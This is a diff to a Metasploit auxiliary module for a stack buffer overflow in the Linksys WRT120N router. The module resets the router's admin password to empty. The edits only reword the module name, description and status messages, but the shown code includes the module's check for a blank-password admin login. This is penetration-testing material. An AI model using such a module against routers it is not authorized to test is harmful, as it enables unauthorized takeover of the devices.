@@ -11,9 +11,9 @@ class Metasploit3 < Msf::Auxiliary
 
   def initialize(info = {})
     super(update_info(info,
-      'Name'            => 'Linksys WRT120N tmUnblock Buffer Overflow',
+      'Name'            => 'Linksys WRT120N tmUnblock Stack Buffer Overflow',
       'Description'     => %q{
-        This module exploits a buffer overflow vulnerability in the WRT120N Linksys router
+        This module exploits a stack-based buffer overflow vulnerability in the WRT120N Linksys router
         to reset the password of the management interface temporarily to an empty value.
         This module has been tested successfully on a WRT120N device with firmware version
         1.0.07.
@@ -41,13 +41,13 @@ class Metasploit3 < Msf::Auxiliary
       'authorization' => basic_auth(user,"")
     })
     if res.nil? || res.code == 404
-      print_status("#{peer} - No successful login possible with #{user} and empty password")
+      print_status("#{peer} - No login possible with #{user} and empty password")
       return false
     elsif [200, 301, 302].include?(res.code)
       print_good("#{peer} - Successful login #{user} and empty password")
       return true
     else
-      print_status("#{peer} - No successful login possible with #{user} and empty password")
+      print_status("#{peer} - No login possible with #{user} and empty password")
       return false
     end
   end
@@ -96,10 +96,10 @@ class Metasploit3 < Msf::Auxiliary
         if check_login("admin")
           print_good("#{peer} - Expected answer and the login was successful. Try to login with the user admin and a blank password")
         else
-          print_status("#{peer} - Expected answer, but unknown exploiting status. Try to login with the user admin and a blank password")
+          print_status("#{peer} - Expected answer, but unknown exploit status. Try to login with the user admin and a blank password")
         end
       else
-        print_error("#{peer} - Unexpected answer. Exploiting attempt has failed")
+        print_error("#{peer} - Unexpected answer. Exploit attempt has failed")
       end
     rescue ::Rex::ConnectionError
       print_error("#{peer} - Failed to connect to the web server")
